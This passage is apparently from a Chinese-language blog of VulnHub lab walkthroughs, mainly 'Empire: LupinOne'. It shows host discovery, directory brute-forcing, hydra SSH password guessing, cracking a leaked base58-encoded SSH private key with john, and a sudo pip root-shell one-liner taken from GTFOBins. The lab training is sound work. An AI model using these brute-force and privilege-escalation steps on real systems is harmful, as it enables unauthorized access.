<p>ftp 登录并下载 flag1.txt 和 word.dir【<a
href="https://www.cnblogs.com/hider/p/10720895.html">Linux学习笔记：使用ftp命令上传和下载文件
- Hider1214 - 博客园</a>】</p>
<p>flag1.txt：₣Ⱡ₳₲{7e3c118631b68d159d9399bda66fc684}</p>
<p>word.dir 是个字典，可能是遍历目录时所需的</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>目录遍历</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271319259.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271319260.png" /></p>
<p>找到个用户名 username: hackathonll</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271320778.png" /></p>
<p>拿刚才的 word.dir 尝试爆下 ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l hackathonll -P word.dir  ssh://192.168.159.130 -e nsr -v -s 7223 -t 10</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271327521.png" /></p>
<p>得 hackathonll/Ti@gO</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>ssh 登录 hackathonll/Ti@gO</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271330221.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>利用 vim 提权【<a href="https://gtfobins.github.io/gtfobins/vim/">vim
| GTFOBins</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271342790.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271342791.png" /></p>
<p>成功拿到 flag2!</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>shell</tag>
        <tag>提权</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>Empire: LupinOne</title>
    <url>/2024/04/16/Empire%20LupinOne/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/empire-lupinone,750/">Empire:
LupinOne ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts              </span><br><span class="line">9 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 540         </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.        </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      4     240  VMware, Inc.       </span><br><span class="line">192.168.159.254 00:50:56:e7:16:18      2     120  VMware, Inc.       </span><br><span class="line">192.168.159.150 00:0c:29:0f:d9:95      2     120  VMware, Inc.</span><br></pre></td></tr></table></figure>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-16 02:13 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.150</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)</span><br><span class="line">|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)</span><br><span class="line">|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.48 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.48 (Debian)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/~myfiles</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:0F:D9:95 (VMware)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 4.X|5.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span></span><br><span class="line"><span class="string">OS details: Linux 4.15 - 5.8</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   1.35 ms 192.168.159.150</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 28.13 seconds</span></span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 主页 arsene_lupin.jpg 尝试隐写分析未果，根据 robots.txt 访问
<code>http://192.168.159.150/~myfiles/</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161901778.png" /></p>
<p>扫描 /~myfiles/ 和根目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.150/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,json,html</span><br><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.150/~myfiles/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,json,html</span><br></pre></td></tr></table></figure>
<p>没扫到有用信息……可能又是字典问题，谷歌……根目录有个
<code>/~secret/</code> 路径【拼字典？？……】，访问得</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161907087.png" /></p>
<p>提示该目录下有个 ssh 私钥文件，破解的话得用 fasttrack 字典，用户名是
icex64，根据提示继续扫目录……</p>
<p>dirsearch 常规扫描没扫到，扫 ssh 私钥可能要加个前缀 <code>.</code>
，再次尝试扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.150/~secret/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,pub --prefixes=. -f</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404162145811.png" /></p>
<p>得私钥 .mysecret.txt</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161931963.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>
<p>经测是 base58 的编码，解码得私钥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp</span><br><span class="line">PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk</span><br><span class="line">9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9</span><br><span class="line">H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6</span><br><span class="line">xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7</span><br><span class="line">J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu</span><br><span class="line">/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0</span><br><span class="line">ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I</span><br><span class="line">he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf</span><br><span class="line">XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA</span><br><span class="line">hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb</span><br><span class="line">4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq</span><br><span class="line">mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp</span><br><span class="line">MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA</span><br><span class="line">2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb</span><br><span class="line">QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE</span><br><span class="line">vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ</span><br><span class="line">0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft</span><br><span class="line">rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB</span><br><span class="line">QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy</span><br><span class="line">x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG</span><br><span class="line">nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5</span><br><span class="line">VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO</span><br><span class="line">cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh</span><br><span class="line">nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm</span><br><span class="line">8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH</span><br><span class="line">zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw</span><br><span class="line">n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl</span><br><span class="line">AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93</span><br><span class="line">oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI</span><br><span class="line">63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV</span><br><span class="line">y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+</span><br><span class="line">t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2</span><br><span class="line">Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU</span><br><span class="line">yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI</span><br><span class="line">8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU</span><br><span class="line">mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r</span><br><span class="line">VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ</span><br><span class="line">E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ</span><br><span class="line">BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2</span><br><span class="line">yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+</span><br><span class="line">wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P</span><br><span class="line">5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8</span><br><span class="line">vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ</span><br><span class="line">Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB</span><br><span class="line">1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB</span><br><span class="line">ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC</span><br><span class="line">iUJ66WmRUN9EoVlkeCzQJwivI=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>利用 ssh2john 转换成 john 可处理的格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh2john mysecret &gt; id_rsa</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404162006918.png" /></p>
<p>john 用 fasttrack 字典破解【<a
href="https://forums.kali.org/showthread.php?51115-fasttrack-txt-wordlst">fasttrack.txt
wordlst</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john id_rsa --wordlist=/usr/share/wordlists/fasttrack.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404162009492.png" /></p>
<p>得 <code>P@55w0rd!</code></p>
<h3 id="补充踩坑">1.4. 补充【踩坑】</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> .mysecret.txt | base58 -d &gt; mysecret</span><br></pre></td></tr></table></figure>
<p>直接用上面命令解码写入的私钥虽不影响 john
的破解，但破解后用私钥【mysecret】登录会报错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Load key <span class="string">&quot;mysecret&quot;</span>: error <span class="keyword">in</span> libcrypto</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404162006658.png" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>ssh 私钥登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 400 prekey  <span class="comment">#  600 亦可</span></span><br><span class="line">ssh icex64@192.168.159.150 -i prekey</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404162012767.png" /></p>
<p>拿到一个 flag</p>
<h3 id="提权">2.2. 提权</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404162015542.png" /></p>
<p>当前用户没法直接对 heist.py 修改，但该脚本导入了 webbrowser
模块，经查当前用户对 <code>/usr/lib/python3.9/webbrowser.py</code>
有写权限，切换个 arsene 用户的 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404162024002.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404162017834.png" /></p>
<p><code>sudo -l</code> 找到个 pip【<a
href="https://gtfobins.github.io/gtfobins/pip/">pip | GTFOBins</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip install <span class="variable">$TF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"></span><br><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/bash&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;, &#x27;bash &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404162025881.png" /></p>
<p>获得根目录 flag</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DriftingBlues: 9 (final)</title>
    <url>/2024/03/31/DriftingBlues%209/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/driftingblues-9-final,695/">DriftingBlues:
9 (final) ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312006441.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312006243.png" /></p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 端口是 ApPHP MicroBlog， 源码可得版本是 1.0.1</p>
<p>扫目录，并找找历史漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.145/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,txt,json -f</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[06:07:13] 200 -    6KB - /index.php                                       </span><br><span class="line">[06:07:13] 301 -  319B  - /images  -&gt;  http://192.168.159.145/images/      </span><br><span class="line">[06:07:13] 200 -    3KB - /images/                                         </span><br><span class="line">[06:07:14] 301 -  317B  - /docs  -&gt;  http://192.168.159.145/docs/          </span><br><span class="line">[06:07:14] 301 -  317B  - /page  -&gt;  http://192.168.159.145/page/          </span><br><span class="line">[06:07:14] 200 -    2KB - /page/                                           </span><br><span 